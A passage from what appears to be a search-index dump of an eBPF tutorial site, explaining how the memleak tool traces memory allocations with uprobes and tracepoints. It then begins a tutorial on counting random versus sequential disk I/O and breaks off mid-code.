Debugging Memory Leaks","text":"<p>Debugging memory leak issues is a complex and challenging task. This involves detailed examination of the program's configuration, memory allocation, and deallocation, often requiring specialized tools to aid in diagnosis. For example, there are tools that can associate malloc() function calls with specific detection tools, such as Valgrind memcheck, which can simulate the CPU to check all memory accesses, but may greatly slow down the application's execution speed. Another option is to use heap analyzers, such as libtcmalloc, which are relatively faster but may still decrease the application's execution speed by more than five times. Additionally, there are tools like gdb that can obtain core dumps of applications and perform post-processing analysis of memory usage. However, these tools often require pausing the application during core dump acquisition or calling the free() function after the application terminates.</p>"},{"location":"tutorials/16-memleak/#role-of-ebpf","title":"Role of eBPF","text":"<p>In this context, the role of eBPF becomes particularly important. eBPF provides an efficient mechanism for monitoring and tracking system-level events, including memory allocation and deallocation. With eBPF, we can trace memory allocation and deallocation requests and collect the call stacks for each allocation. We can then analyze this information to identify call stacks that perform memory allocations but do not perform subsequent deallocations, helping us identify the source of memory leaks. The advantage of this approach is that it can be done in real-time within a running application without pausing the application or performing complex post-processing.</p> <p>The <code>memleak</code> eBPF tool can trace and match memory allocation and deallocation requests, and collect the call stacks for each allocation. Subsequently, <code>memleak</code> can print a summary indicating which call stacks executed allocations but did not perform subsequent deallocations. For example, running the command:</p> <pre><code># ./memleak -p $(pidof allocs)\nAttaching to pid 5193, Ctrl+C to quit.\n[11:16:33] Top 2 stacks with outstanding allocations:\n        80 bytes in 5 allocations from stack\n                 main+0x6d [allocs]\n                 __libc_start_main+0xf0 [libc-2.21.so]\n\n[11:16:34] Top 2 stacks with outstanding allocations:\n        160 bytes in 10 allocations from stack\n                 main+0x6d [allocs]\n                 __libc_start_main+0xf0 [libc-2.21.so]\n</code></pre> <p>After running this command, we can see which stacks the allocated but not deallocated memory came from, as well as the size and quantity of these unreleased memory blocks.</p> <p>Over time, it becomes evident that the <code>main</code> function of the <code>allocs</code> process is leaking memory, 16 bytes at a time. Fortunately, we don't need to inspect each allocation; we have a nice summary that tells us which stack is responsible for the significant leaks.</p>"},{"location":"tutorials/16-memleak/#implementation-principle-of-memleak","title":"Implementation Principle of memleak","text":"<p>At a basic level, <code>memleak</code> operates by installing monitoring devices on the memory allocation and deallocation paths. It achieves this by inserting eBPF programs into memory allocation and deallocation functions. This means that when these functions are called, <code>memleak</code> will record important information, such as the caller's process ID (PID), the allocated memory address, and the size of the allocated memory. When the function for freeing memory is called, <code>memleak</code> will delete the corresponding memory allocation record in its internal map. This mechanism allows <code>memleak</code> to accurately trace which memory blocks have been allocated but not deallocated.For commonly used memory allocation functions in user space, such as <code>malloc</code> and <code>calloc</code>, <code>memleak</code> uses user space probing (uprobe) technology for monitoring. Uprobe is a dynamic tracing technology for user space applications, which can set breakpoints at any location at runtime without modifying the binary files, thus achieving tracing of specific function calls.</p> <p>Uprobe in kernel mode eBPF runtime may also cause relatively large performance overhead. In this case, you can also consider using user mode eBPF runtime, such as bpftime. bpftime is a user mode eBPF runtime based on LLVM JIT/AOT. It can run eBPF programs in user mode and is compatible with kernel mode eBPF, avoiding context switching between kernel mode and user mode, thereby improving the execution efficiency of eBPF programs by 10 times.</p> <p>For kernel space memory allocation functions, such as <code>kmalloc</code>, <code>memleak</code> chooses to use tracepoints for monitoring. Tracepoint is a dynamic tracing technology provided in the Linux kernel, which can dynamically trace specific events in the kernel at runtime without recompiling the kernel or loading kernel modules.</p>"},{"location":"tutorials/16-memleak/#kernel-space-ebpf-program-implementation","title":"Kernel Space eBPF Program Implementation","text":""},{"location":"tutorials/16-memleak/#memleak-kernel-space-ebpf-program-implementation","title":"<code>memleak</code> Kernel Space eBPF Program Implementation","text":"<p>The kernel space eBPF program of <code>memleak</code> contains some key functions for tracking memory allocation and deallocation. Before delving into these functions, let's first take a look at some data structures defined by <code>memleak</code>, which are used in both its kernel space and user space programs.</p> <pre><code>#ifndef __MEMLEAK_H\n#define __MEMLEAK_H\n\n#define ALLOCS_MAX_ENTRIES 1000000\n#define COMBINED_ALLOCS_MAX_ENTRIES 10240\n\nstruct alloc_info {\n    __u64 size;            // Size of allocated memory\n    __u64 timestamp_ns;    // Timestamp when allocation occurs, in nanoseconds\n    int stack_id;          // Call stack ID when allocation occurs\n};\n\nunion combined_alloc_info {\n    struct {\n        __u64 total_size : 40;        // Total size of all unreleased allocations\n        __u64 number_of_allocs : 24;   // Total number of unreleased allocations\n    };\n    __u64 bits;    // Bitwise representation of the structure\n};\n\n#endif /* __MEMLEAK_H */\n</code></pre> <p>Here, two main data structures are defined: <code>alloc_info</code> and <code>combined_alloc_info</code>.</p> <p>The <code>alloc_info</code> structure contains basic information about a memory allocation, including the allocated memory size <code>size</code>, the timestamp <code>timestamp_ns</code> when the allocation occurs, and the call stack ID <code>stack_id</code> that triggers the allocation.</p> <p>The <code>combined_alloc_info</code> is a union that contains an embedded structure and a <code>__u64</code> type bitwise representation <code>bits</code>. The embedded structure has two members: <code>total_size</code> and <code>number_of_allocs</code>, representing the total size and total count of unreleased allocations, respectively. The numbers 40 and 24 indicate the number of bits occupied by the <code>total_size</code> and <code>number_of_allocs</code> members, limiting their size. By using this limitation, storage space for the <code>combined_alloc_info</code> structure can be saved. Moreover, since <code>total_size</code> and <code>number_of_allocs</code> share the same <code>unsigned long long</code> type variable <code>bits</code> for storage, bitwise operations on the member variable <code>bits</code> can be used to access and modify <code>total_size</code> and <code>number_of_allocs</code>, avoiding the complexity of defining additional variables and functions in the program.</p> <p>Next, <code>memleak</code> defines a series of eBPF maps for storing memory allocation information and analysis results. These maps are defined in the form of <code>SEC(\".maps\")</code>, indicating that they belong to the mapping section of the eBPF program.</p> <pre><code>const volatile size_t min_size = 0;\nconst volatile size_t max_size = -1;\nconst volatile size_t page_size = 4096;\nconst volatile __u64 sample_rate = 1;\nconst volatile bool trace_all = false;\nconst volatile __u64 stack_flags = 0;\nconst volatile bool wa_missing_free = false;\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __type(key, pid_t);\n    __type(value, u64);\n    __uint(max_entries, 10240);\n} sizes SEC(\".maps\");\n\nstruct {\n  //... (continued)__uint(type, BPF_MAP_TYPE_HASH);\n    __type(key, u64); /* address */\n    __type(value, struct alloc_info);\n    __uint(max_entries, ALLOCS_MAX_ENTRIES);\n} allocs SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __type(key, u64); /* stack id */\n    __type(value, union combined_alloc_info);\n    __uint(max_entries, COMBINED_ALLOCS_MAX_ENTRIES);\n} combined_allocs SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __type(key, u64);\n    __type(value, u64);\n    __uint(max_entries, 10240);\n} memptrs SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_STACK_TRACE);\n    __type(key, u32);\n} stack_traces SEC(\".maps\");\n\nstatic union combined_alloc_info initial_cinfo;\n</code></pre> <p>The code first defines some configurable parameters, such as <code>min_size</code>, <code>max_size</code>, <code>page_size</code>, <code>sample_rate</code>, <code>trace_all</code>, <code>stack_flags</code>, and <code>wa_missing_free</code>, representing the minimum allocation size, maximum allocation size, page size, sample rate, whether to trace all allocations, stack flags, and whether to work in missing free mode.</p> <p>Then, five maps are defined:</p> <ol> <li><code>sizes</code>: This is a hash-type map with the key as the process ID and the value as <code>u64</code> type, storing the allocation size of each process.</li> <li><code>allocs</code>: This is also a hash-type map with the key as the allocation address and the value as the <code>alloc_info</code> structure, storing detailed information about each memory allocation.</li> <li><code>combined_allocs</code>: This is another hash-type map with the key as the stack ID and the value as the <code>combined_alloc_info</code> union, storing the total size and count of all unreleased allocations.</li> <li><code>memptrs</code>: This is also a hash-type map with both the key and value as <code>u64</code> type, used to pass memory pointers between user space and kernel space.</li> <li><code>stack_traces</code>: This is a stack trace-type map with the key as <code>u32</code> type, used to store stack IDs.</li> </ol> <p>Taking the user-space memory allocation tracing as an example, it mainly hooks memory-related function calls such as <code>malloc</code>, <code>free</code>, <code>calloc</code>, <code>realloc</code>, <code>mmap</code>, and <code>munmap</code> to record data when these functions are called. In user space, <code>memleak</code> mainly uses uprobes technology for hooking.</p> <p>Each function call is divided into \"enter\" and \"exit\" parts. The \"enter\" part records the function call parameters, such as the size of the allocation or the address being freed. The \"exit\" part is mainly used to obtain the return value of the function, such as the memory address obtained from the allocation.</p> <p>Here, <code>gen_alloc_enter</code>, <code>gen_alloc_exit</code>, <code>gen_free_enter</code> are functions that implement the recording behavior, and they are used to record relevant information when allocation starts, allocation ends, and freeing starts, respectively.</p> <p>The function prototype is as follows:</p> <pre><code>SEC(\"uprobe\")\nint BPF_KPROBE(malloc_enter, size_t size)\n{\n    // Record relevant information when allocation starts\n    return gen_alloc_enter(size);\n}\n\nSEC(\"uretprobe\")\nint BPF_KRETPROBE(malloc_exit)\n{\n    // Record relevant information when allocation ends\n    return gen_alloc_exit(ctx);\n}\n\nSEC(\"uprobe\")\nint BPF_KPROBE(free_enter, void *address)\n{\n    // Record relevant information when freeing starts\n    return gen_free_enter(address);\n}\n</code></pre> <p><code>malloc_enter</code> and <code>free_enter</code> are probes mounted at the entry points of the <code>malloc</code> and <code>free</code> functions, respectively, to record data during function calls. <code>malloc_exit</code> is a probe mounted at the return point of the <code>malloc</code> function to record the return value of the function.</p> <p>These functions are declared using the <code>BPF_KPROBE</code> and <code>BPF_KRETPROBE</code> macros, which are used to declare kprobes (kernel probes) and kretprobes (kernel return probes), respectively. Specifically, kprobe is triggered during function calls, while kretprobe is triggered during function returns.</p> <p>The <code>gen_alloc_enter</code> function is called at the beginning of a memory allocation request. This function is mainly responsible for collecting some basic information when the function that allocates memory is called. Now, let's take a deep dive into the implementation of this function.</p> <pre><code>static int gen_alloc_enter(size_t size)\n{\n    if (size &lt; min_size || size &gt; max_size)\n        return 0;\n\n    if (sample_rate &gt; 1) {\n        if (bpf_ktime_get_ns() % sample_rate != 0)\n            return 0;\n    }\n\n    const pid_t pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    bpf_map_update_elem(&amp;sizes, &amp;pid, &amp;size, BPF_ANY);\n\n    if (trace_all)\n        bpf_printk(\"alloc entered, size = %lu\\n\", size);\n\n    return 0;\n}\n\nSEC(\"uprobe\")\nint BPF_KPROBE(malloc_enter, size_t size)\n{\n    return gen_alloc_enter(size);\n}\n</code></pre> <p>First, the <code>gen_alloc_enter</code> function takes a <code>size</code> parameter that represents the size of the requested memory allocation. If this value is not between <code>min_size</code> and <code>max_size</code>, the function will return directly without performing any further operations. This allows the tool to focus on tracing memory allocation requests within a specific range and filter out uninteresting allocation requests.</p> <p>Next, the function checks the sampling rate <code>sample_rate</code>. If <code>sample_rate</code> is greater than 1, it means that we don't need to trace all memory allocation requests, but rather trace them periodically. Here, <code>bpf_ktime_get_ns</code> is used to get the current timestamp, and the modulus operation is used to determine whether to trace the current memory allocation request. This is a common sampling technique used to reduce performance overhead while providing a representative sample for analysis.</p> <p>Then, the function uses the <code>bpf_get_current_pid_tgid</code> function to retrieve the current process's PID. Note that the PID here is actually a combination of the process ID and thread ID, and we shift it right by 32 bits to get the actual process ID.</p> <p>The function then updates the <code>sizes</code> map, which uses the process ID as the key and the requested memory allocation size as the value. <code>BPF_ANY</code> indicates that if the key already exists, the value will be updated; otherwise, a new entry will be created.</p> <p>Finally, if the <code>trace_all</code> flag is enabled, the function will print a message indicating that a memory allocation has occurred.</p> <p>The <code>BPF_KPROBE</code> macro is used to intercept the execution of the <code>malloc</code> function with a BPF uprobe when the <code>malloc_enter</code> function is called, and it records the memory allocation size using <code>gen_alloc_enter</code>. We have just analyzed the entry function <code>gen_alloc_enter</code> of memory allocation, now let's focus on the exit part of this process. Specifically, we will discuss the <code>gen_alloc_exit2</code> function and how to obtain the returned memory address from the memory allocation call.</p> <pre><code>static int gen_alloc_exit2(void *ctx, u64 address)\n{\n    const pid_t pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    struct alloc_info info;\n\n    const u64* size = bpf_map_lookup_elem(&amp;sizes, &amp;pid);\n    if (!size)\n        return 0; // missed alloc entry\n\n    __builtin_memset(&amp;info, 0, sizeof(info));\n\n    info.size = *size;bpf_map_delete_elem(&amp;sizes, &amp;pid);\n\n    if (address != 0) {\n        info.timestamp_ns = bpf_ktime_get_ns();\n\n        info.stack_id = bpf_get_stackid(ctx, &amp;stack_traces, stack_flags);\n\n        bpf_map_update_elem(&amp;allocs, &amp;address, &amp;info, BPF_ANY);\n\n        update_statistics_add(info.stack_id, info.size);\n    }\n\n    if (trace_all) {\n        bpf_printk(\"alloc exited, size = %lu, result = %lx\\n\",\n                info.size, address);\n    }\n\n    return 0;\n}\n\nstatic int gen_alloc_exit(struct pt_regs *ctx)\n{\n    return gen_alloc_exit2(ctx, PT_REGS_RC(ctx));\n}\n\nSEC(\"uretprobe\")\nint BPF_KRETPROBE(malloc_exit)\n{\n    return gen_alloc_exit(ctx);\n}\n</code></pre> <p><code>gen_alloc_exit2</code> function is called when the memory allocation operation is completed. This function takes two parameters, one is the context <code>ctx</code> and the other is the memory address returned by the memory allocation function <code>address</code>.</p> <p>First, it obtains the PID (Process ID) of the current thread and uses it as a key to look up the corresponding memory allocation size in the <code>sizes</code> map. If not found (i.e., no entry for the memory allocation operation), the function simply returns.</p> <p>Then, it clears the content of the <code>info</code> structure and sets its <code>size</code> field to the memory allocation size found in the map. It also removes the corresponding element from the <code>sizes</code> map because the memory allocation operation has completed and this information is no longer needed.</p> <p>Next, if <code>address</code> is not zero (indicating a successful memory allocation operation), the function further collects some additional information. First, it obtains the current timestamp as the completion time of the memory allocation and fetches the current stack trace. These pieces of information are stored in the <code>info</code> structure and subsequently updated in the <code>allocs</code> map.</p> <p>Finally, the function calls <code>update_statistics_add</code> to update the statistics data and, if tracing of all memory allocation operations is enabled, it prints some information about the memory allocation operation.</p> <p>Note that, <code>gen_alloc_exit</code> is a wrapper for <code>gen_alloc_exit2</code>, which passes <code>PT_REGS_RC(ctx)</code> as the <code>address</code> parameter to <code>gen_alloc_exit2</code>.</p> <p>In our discussion, we just mentioned that <code>update_statistics_add</code> function is called in the <code>gen_alloc_exit2</code> function to update the statistics data for memory allocations. Now let's take a closer look at the implementation of this function.</p> <pre><code>static void update_statistics_add(u64 stack_id, u64 sz)\n{\n    union combined_alloc_info *existing_cinfo;\n\n    existing_cinfo = bpf_map_lookup_or_try_init(&amp;combined_allocs, &amp;stack_id, &amp;initial_cinfo);\n    if (!existing_cinfo)\n        return;\n\n    const union combined_alloc_info incremental_cinfo = {\n        .total_size = sz,\n        .number_of_allocs = 1\n    };\n\n    __sync_fetch_and_add(&amp;existing_cinfo-&gt;bits, incremental_cinfo.bits);\n}\n</code></pre> <p>The <code>update_statistics_add</code> function takes two parameters: the current stack ID <code>stack_id</code> and the size of the memory allocation <code>sz</code>. These two parameters are collected in the memory allocation event and used to update the statistics data for memory allocations.First, the function tries to find the element with the current stack ID as the key in the <code>combined_allocs</code> map. If it is not found, a new element is initialized with <code>initial_cinfo</code> (which is a default <code>combined_alloc_info</code> structure with all fields set to zero).</p> <p>Next, the function creates an <code>incremental_cinfo</code> and sets its <code>total_size</code> to the current memory allocation size and <code>number_of_allocs</code> to 1. This is because each call to the <code>update_statistics_add</code> function represents a new memory allocation event, and the size of this event's memory allocation is <code>sz</code>.</p> <p>Finally, the function atomically adds the value of <code>incremental_cinfo</code> to <code>existing_cinfo</code> using the <code>__sync_fetch_and_add</code> function. Note that this step is thread-safe, so even if multiple threads call the <code>update_statistics_add</code> function concurrently, each memory allocation event will be correctly recorded in the statistics.</p> <p>In summary, the <code>update_statistics_add</code> function implements the logic for updating memory allocation statistics. By maintaining the total amount and number of memory allocations for each stack ID, we can gain insight into the memory allocation behavior of the program.</p> <p>In our process of tracking memory allocation statistics, we not only need to count memory allocations but also consider memory releases. In the above code, we define a function called <code>update_statistics_del</code> that updates the statistics when memory is freed. The function <code>gen_free_enter</code> is executed when the process calls the <code>free</code> function.</p> <p>The <code>update_statistics_del</code> function takes the stack ID and the size of the memory block to be freed as parameters. First, the function uses the current stack ID as the key to look up the corresponding <code>combined_alloc_info</code> structure in the <code>combined_allocs</code> map. If it is not found, an error message is output and the function returns. If it is found, a <code>decremental_cinfo</code> <code>combined_alloc_info</code> structure is constructed with its <code>total_size</code> set to the size of the memory to be freed and <code>number_of_allocs</code> set to 1. Then the <code>__sync_fetch_and_sub</code> function is used to atomically subtract the value of <code>decremental_cinfo</code> from <code>existing_cinfo</code>. Note that the <code>number_of_allocs</code> here is negative, indicating a decrease in memory allocation.</p> <p>The <code>gen_free_enter</code> function takes the address to be freed as a parameter. It first converts the address to an unsigned 64-bit integer (<code>u64</code>). Then it looks up the <code>alloc_info</code> structure in the <code>allocs</code> map using the address as the key. If it is not found, the function returns 0. If it is found, the <code>alloc_info</code> structure is deleted from the <code>allocs</code> map, and the <code>update_statistics_del</code> function is called with the stack ID and size from <code>info</code>. If <code>trace_all</code> is true, an information message is output.</p> <pre><code>int BPF_KPROBE(free_enter, void *address)\n{\n    return gen_free_enter(address);\n}\n</code></pre> <p>Next, let's look at the <code>gen_free_enter</code> function. It takes an address as a parameter, which is the result of memory allocation, i.e., the starting address of the memory to be freed. The function first uses this address as a key to search for the corresponding <code>alloc_info</code> structure in the <code>allocs</code> map. If it is not found, it simply returns because it means that this address has not been allocated. If it is found, the element is deleted, and the <code>update_statistics_del</code> function is called to update the statistics data. Finally, if global tracking is enabled, a message is also output, including this address and its size.</p> <p>While tracking and profiling memory allocation, we also need to track kernel-mode memory allocation and deallocation. In the Linux kernel, the <code>kmem_cache_alloc</code> function and the <code>kfree</code> function are used for kernel-mode memory allocation and deallocation, respectively.</p> <pre><code>SEC(\"tracepoint/kmem/kfree\")\nint memleak__kfree(void *ctx)\n{\n    const void *ptr;\n\n    if (has_kfree()) {\n        struct trace_event_raw_kfree___x *args = ctx;\n        ptr = BPF_CORE_READ(args, ptr);\n    } else {\n        struct trace_event_raw_kmem_free___x *args = ctx;\n        ptr = BPF_CORE_READ(args, ptr);\n    }\n\n    return gen_free_enter(ptr);\n}\n</code></pre> <p>The above code snippet defines a function <code>memleak__kfree</code>. This is a BPF program that will be executed when the <code>kfree</code> function is called in the kernel. First, the function checks if <code>kfree</code> exists. If it does, it reads the argument passed to the <code>kfree</code> function (i.e., the address of the memory block to be freed) and saves it in the variable <code>ptr</code>. Otherwise, it reads the argument passed to the <code>kmem_free</code> function (i.e., the address of the memory block to be freed) and saves it in the variable <code>ptr</code>. Then, the function calls the previously defined <code>gen_free_enter</code> function to handle the release of this memory block.</p> <pre><code>SEC(\"tracepoint/kmem/kmem_cache_alloc\")\nint memleak__kmem_cache_alloc(struct trace_event_raw_kmem_alloc *ctx)\n{\n    if (wa_missing_free)\n        gen_free_enter(ctx-&gt;ptr);\n\n    gen_alloc_enter(ctx-&gt;bytes_alloc);\n\n    return gen_alloc_exit2(ctx, (u64)(ctx-&gt;ptr));\n}\n</code></pre> <p>This code snippet defines a function <code>memleak__kmem_cache_alloc</code>. This is also a BPF program that will be executed when the <code>kmem_cache_alloc</code> function is called in the kernel. If the <code>wa_missing_free</code> flag is set, it calls the <code>gen_free_enter</code> function to handle possible missed release operations. Then, the function calls the <code>gen_alloc_enter</code> function to handle memory allocation and finally calls the <code>gen_alloc_exit2</code> function to record the allocation result.</p> <p>Both of these BPF programs use the <code>SEC</code> macro to define the corresponding tracepoints, so that they can be executed when the corresponding kernel functions are called. In the Linux kernel, a tracepoint is a static hook that can be inserted into the kernel to collect runtime kernel information. It is very useful for debugging and performance analysis.</p> <p>In the process of understanding this code, pay attention to the use of the <code>BPF_CORE_READ</code> macro. This macro is used to read kernel data in BPF programs. In BPF programs, we cannot directly access kernel memory and need to use such macros to safely read data.</p>"},{"location":"tutorials/16-memleak/#user-space-program","title":"User-Space Program","text":"<p>After understanding the BPF kernel part, let's switch to the user-space program. The user-space program works closely with the BPF kernel program. It is responsible for loading BPF programs into the kernel, setting up and managing BPF maps, and handling data collected from BPF programs. The user-space program is longer, but here we can briefly refer to its mount point.</p> <pre><code>int attach_uprobes(struct memleak_bpf *skel)\n{\n    ATTACH_UPROBE_CHECKED(skel, malloc, malloc_enter);\n        ATTACH_URETPROBE_CHECKED(skel, malloc, malloc_exit);\n    ATTACH_UPROBE_CHECKED(skel, calloc, calloc_enter);\n    ATTACH_URETPROBE_CHECKED(skel, calloc, calloc_exit);\n\n    ATTACH_UPROBE_CHECKED(skel, realloc, realloc_enter);\n    ATTACH_URETPROBE_CHECKED(skel, realloc, realloc_exit);\n\n    ATTACH_UPROBE_CHECKED(skel, mmap, mmap_enter);\n    ATTACH_URETPROBE_CHECKED(skel, mmap, mmap_exit);\n\n    ATTACH_UPROBE_CHECKED(skel, posix_memalign, posix_memalign_enter);\n    ATTACH_URETPROBE_CHECKED(skel, posix_memalign, posix_memalign_exit);\n\n    ATTACH_UPROBE_CHECKED(skel, memalign, memalign_enter);\n    ATTACH_URETPROBE_CHECKED(skel, memalign, memalign_exit);\n\n    ATTACH_UPROBE_CHECKED(skel, free, free_enter);\n    ATTACH_UPROBE_CHECKED(skel, munmap, munmap_enter);\n\n    // the following probes are intentionally allowed to fail attachment\n\n    // deprecated in libc.so bionic\n    ATTACH_UPROBE(skel, valloc, valloc_enter);\n    ATTACH_URETPROBE(skel, valloc, valloc_exit);\n\n    // deprecated in libc.so bionic\n    ATTACH_UPROBE(skel, pvalloc, pvalloc_enter);\n    ATTACH_URETPROBE(skel, pvalloc, pvalloc_exit);\n\n    // added in C11\n    ATTACH_UPROBE(skel, aligned_alloc, aligned_alloc_enter);\n    ATTACH_URETPROBE(skel, aligned_alloc, aligned_alloc_exit);\n\n    return 0;\n}\n</code></pre> <p>In this code snippet, we see a function called <code>attach_uprobes</code> that mounts uprobes (user space probes) onto memory allocation and deallocation functions. In Linux, uprobes are a kernel mechanism that allows setting breakpoints at arbitrary locations in user space programs, enabling precise observation and control over the behavior of user space programs.</p> <p>Here, each memory-related function is traced using two uprobes: one at the entry (enter) of the function and one at the exit. Thus, every time these functions are called or return, a uprobes event is triggered, which in turn triggers the corresponding BPF program.</p> <p>In the actual implementation, we use two macros, <code>ATTACH_UPROBE</code> and <code>ATTACH_URETPROBE</code>, to attach uprobes and uretprobes (function return probes), respectively. Each macro takes three arguments: the skeleton of the BPF program (skel), the name of the function to monitor, and the name of the BPF program to trigger.</p> <p>These mount points include common memory allocation functions such as malloc, calloc, realloc, mmap, posix_memalign, memalign, free, and their corresponding exit points. Additionally, we also observe some possible allocation functions such as valloc, pvalloc, aligned_alloc, although they may not always exist.</p> <p>The goal of these mount points is to capture all possible memory allocation and deallocation events, allowing our memory leak detection tool to obtain as comprehensive data as possible. This approach enables us to track not only memory allocation and deallocation but also their contextual information such as call stacks and invocation counts, helping us to pinpoint and fix memory leak issues.</p> <p>Note that some memory allocation functions may not exist or may have been deprecated, such as valloc and pvalloc. Thus, their attachment may fail. In such cases, we allow for attachment failures, which do not prevent the program from executing. This is because we are more focused on mainstream and commonly used memory allocation functions, while these deprecated functions are often used less frequently in practical applications.</p> <p>Complete source code: https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/16-memleak</p> <p>Reference: https://github.com/iovisor/bcc/blob/master/libbpf-tools/memleak.c</p>"},{"location":"tutorials/16-memleak/#compile-and-run","title":"Compile and Run","text":"<pre><code>$ make\n$ sudo ./memleak\nusing default object: libc.so.6\nusing page size: 4096\ntracing kernel: true\nTracing outstanding memory allocs...  Hit Ctrl-C to end\n[17:17:27] Top 10 stacks with outstanding allocations:\n1236992 bytes in 302 allocations from stack\n        0 [&lt;ffffffff812c8f43&gt;] &lt;null sym&gt;\n        1 [&lt;ffffffff812c8f43&gt;] &lt;null sym&gt;\n        2 [&lt;ffffffff812a9d42&gt;] &lt;null sym&gt;\n        3 [&lt;ffffffff812aa392&gt;] &lt;null sym&gt;\n        4 [&lt;ffffffff810df0cb&gt;] &lt;null sym&gt;\n        5 [&lt;ffffffff81edc3fd&gt;] &lt;null sym&gt;\n        6 [&lt;ffffffff82000b62&gt;] &lt;null sym&gt;\n...\n</code></pre>"},{"location":"tutorials/16-memleak/#summary","title":"Summary","text":"<p>Through this eBPF introductory tutorial, you have learned how to write a Memleak eBPF monitoring program to monitor memory leaks in real time. You have also learned about the application of eBPF in memory monitoring, how to write eBPF programs using the BPF API, create and use eBPF maps, and how to use eBPF tools to monitor and analyze memory leak issues. We have provided a detailed example to help you understand the execution flow and principles of eBPF code.</p> <p>You can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p> <p>The original link of this article: https://eunomia.dev/tutorials/16-memleak</p> <p>Share on  Share on </p>"},{"location":"tutorials/17-biopattern/","title":"eBPF Tutorial by Example 17: Count Random/Sequential Disk I/O","text":"<p>eBPF (Extended Berkeley Packet Filter) is a new technology in the Linux kernel that allows users to execute custom programmes in kernel space without changing the kernel code. This provides system administrators and developers with powerful tools to gain insight into and monitor system behaviour for optimisation.</p> <p>In this tutorial, we will explore how to use eBPF to write programs to count random and sequential disk I/O. Disk I/O is one of the key metrics of computer performance, especially in data-intensive applications.</p>"},{"location":"tutorials/17-biopattern/#randomsequential-disk-io","title":"Random/Sequential Disk I/O","text":"<p>As technology advances and data volumes explode, disk I/O becomes a critical bottleneck in system performance. The performance of an application depends heavily on how it interacts with the storage tier. Therefore, it becomes especially important to deeply understand and optimise disk I/O, especially random and sequential I/O.</p> <ol> <li> <p>Random I/O: Random I/O occurs when an application reads or writes data from or to a non-sequential location on the disk. The main characteristic of this I/O mode is that the disk head needs to move frequently between locations, causing it to be typically slower than sequential I/O. Typical scenarios that generate random I/O include database queries, file system metadata operations, and concurrent tasks in virtualised environments.</p> </li> <li> <p>Sequential I/O: In contrast to random I/O, sequential I/O occurs when an application continuously reads or writes blocks of data to or from disk. The advantage of this I/O mode is that the disk head can move continuously in one direction, which greatly increases the speed at which data can be read and written. Video playback, downloading or uploading large files, and continuous logging are typical applications that generate sequential I/O.</p> </li> </ol> <p>To optimise storage performance, it is critical to understand both random and sequential disk I/O. For example, random I/O-sensitive applications typically perform far better on SSDs than on traditional hard drives because SSDs have virtually no addressing latency when dealing with random I/Os. Conversely, for applications with a lot of sequential I/O, it is much more critical to maximize the sequential read and write speed of the disk.</p> <p>In the rest of this tutorial, we will discuss in detail how to use the eBPF tool to monitor and count both types of disk I/O in real time, which will not only help us better understand the I/O behaviour of the system, but will also provide us with strong data for further performance optimization.</p>"},{"location":"tutorials/17-biopattern/#biopattern","title":"Biopattern","text":"<p>Biopattern counts the percentage of random/sequential disk I/Os.</p> <p>First of all, make sure that you have installed libbpf and the associated toolset correctly, you can find the source code here: bpf-developer-tutorial</p> <p>Navigate to the <code>biopattern</code> source directory and compile it using the <code>make</code> command:</p> <pre><code>cd ~/bpf-developer-tutorial/src/17-biopattern\nmake\n</code></pre> <p>After successful compilation, you should see the <code>biopattern</code> executable in the current directory. The basic runtime commands are as follows:</p> <pre><code>sudo ./biopattern [interval] [count]\n</code></pre> <p>For example, to print the output once per second for 10 seconds, you can run:</p> <pre><code>$ sudo ./biopattern 1 10\nTracing block device I/O requested seeks... Hit Ctrl-C to end.\nDISK     %RND  %SEQ    COUNT     KBYTES\nsr0         0   100        3          0\nsr1         0   100        8          0\nsda         0   100        1          4\nsda       100     0       26        136\nsda         0   100        1          4\n</code></pre> <p>The output columns have the following meanings:</p> <ul> <li><code>DISK</code>: Name of the disk being tracked.</li> <li><code>%RND</code>: Percentage of random I/O.</li> <li><code>%SEQ</code>: percentage of sequential I/O.</li> <li><code>COUNT</code>: Number of I/O requests in the specified interval.</li> <li><code>KBYTES</code>: amount of data (in KB) read and written in the specified time interval.</li> </ul> <p>From the above output, we can draw the following conclusions:</p> <ul> <li>The <code>sr0</code> and <code>sr1</code> devices performed mostly sequential I/O during the observation period, but the amount of data was small.</li> <li>The <code>sda</code> device performed only random I/O during some time periods and only sequential I/O during other time periods.</li> </ul> <p>This information can help us understand the I/O pattern of the system so that we can target optimisation.</p>"},{"location":"tutorials/17-biopattern/#ebpf-biopattern-implementation-principles","title":"eBPF Biopattern Implementation Principles","text":"<p>First, let's look at the eBPF kernel state code at the heart of biopattern:</p> <pre><code>#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include \"biopattern.h\"\n#include \"maps.bpf.h\"\n#include \"core_fixes.bpf.h\"\n\nconst volatile bool filter_dev = false;\nconst volatile __u32 targ_dev = 0;\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 64);\n    __type(key, u32);\n    __type(value, struct counter);\n} counters SEC(\".maps\");\n\nSEC(\"tracepoint/block/block_rq_complete\")\nint handle__block_rq_complete(void *args)\n{\n    struct counter *counterp, zero = {};\n    sector_t sector;\n    u32 nr_sector;\n    u32 dev;\n\n    if (has_block_rq_completion()) {\n        struct trace_event_raw_block_rq_completion___x *ctx = args;\n        sector = BPF_CORE_READ(ctx, sector);\n        nr_sector = BPF_CORE_READ(ctx, nr_sector);\n        dev = BPF_CORE_READ(ctx, dev);\n    } else {\n        struct trace_event_raw_block_rq_complete___x *ctx = args;\n        sector = BPF_CORE_READ(ctx, sector);\n        nr_sector = BPF_CORE_READ(ctx, nr_sector);\n        dev = BPF_CORE_READ(ctx, dev);\n    }\n\n    if (filter_dev &amp;&amp; targ_dev != dev)\n        return 0;\n\n    counterp = bpf_map_lookup_or_try_init(&amp;counters, &amp;dev, &amp;zero);\n    if (!counterp)\n        return 0;\n    if (counterp-&gt;last_sector) {\n        if (counterp-&gt;last_sector == sector)\n            __sync_fetch_and_add(&amp;counterp-&gt;sequential, 1);\n        